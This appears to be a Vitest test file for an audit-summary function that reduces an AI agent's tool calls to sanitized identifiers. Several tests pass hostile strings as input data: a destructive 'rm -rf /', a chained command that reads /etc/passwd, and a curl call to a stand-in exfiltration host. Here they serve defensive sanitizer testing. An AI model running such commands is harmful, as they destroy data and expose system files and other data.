import { describe, expect, it } from "vitest";

import { summarizeToolForAudit } from "../../src/tasks/audit-tool-summary.js";

describe("summarizeToolForAudit", () => {
  it("prefers the Skill command identifier", () => {
    expect(
      summarizeToolForAudit("Skill", {
        command: "claude-api",
        skill: "ignored",
        name: "ignored",
      }),
    ).toBe("Skill:claude-api");
  });

  it("falls back to the Skill skill identifier when command is absent", () => {
    expect(summarizeToolForAudit("Skill", { skill: "web-search" })).toBe(
      "Skill:web-search",
    );
  });

  it("falls back to the Skill name identifier when command and skill are absent", () => {
    expect(summarizeToolForAudit("Skill", { name: "commit-helper" })).toBe(
      "Skill:commit-helper",
    );
  });

  it("degrades to the bare tool name when no Skill identifier is present", () => {
    expect(summarizeToolForAudit("Skill", {})).toBe("Skill");
  });

  it("degrades to the bare tool name when identifiers are not strings", () => {
    expect(
      summarizeToolForAudit("Skill", { command: 42, skill: null, name: {} }),
    ).toBe("Skill");
  });

  it("degrades to the bare tool name when the identifier sanitizes to empty", () => {
    expect(summarizeToolForAudit("Skill", { command: "   " })).toBe("Skill");
  });

  it("returns the bare tool name for ordinary tools without reading input", () => {
    expect(summarizeToolForAudit("Bash", { command: "rm -rf /" })).toBe("Bash");
    expect(
      summarizeToolForAudit("Edit", {
        file_path: "C:\\secret\\notes.txt",
        content: "sensitive",
      }),
    ).toBe("Edit");
    expect(summarizeToolForAudit("Read", { file_path: "C:\\secret" })).toBe(
      "Read",
    );
  });

  it("returns the MCP tool name unchanged", () => {
    expect(
      summarizeToolForAudit("mcp__github__create_issue", { title: "x" }),
    ).toBe("mcp__github__create_issue");
  });

  it("truncates an overly long identifier to 64 characters", () => {
    const longCommand = "a".repeat(200);
    const summary = summarizeToolForAudit("Skill", { command: longCommand });
    expect(summary).toBe(`Skill:${"a".repeat(64)}`);
  });

  it("strips characters outside the identifier allow list", () => {
    expect(
      summarizeToolForAudit("Skill", {
        command: "rm -rf / && echo pwned; cat /etc/passwd",
      }),
    ).toBe("Skill:rm-rfechopwnedcatetcpasswd");
  });

  it("never leaks Bash command content through a Skill-like free-text field", () => {
    const summary = summarizeToolForAudit("Skill", {
      command: "curl http://evil.example.com/steal",
    });
    expect(summary).not.toContain(" ");
    expect(summary).not.toContain("://");
    expect(summary.length).toBeLessThanOrEqual("Skill:".length + 64);
  });
});
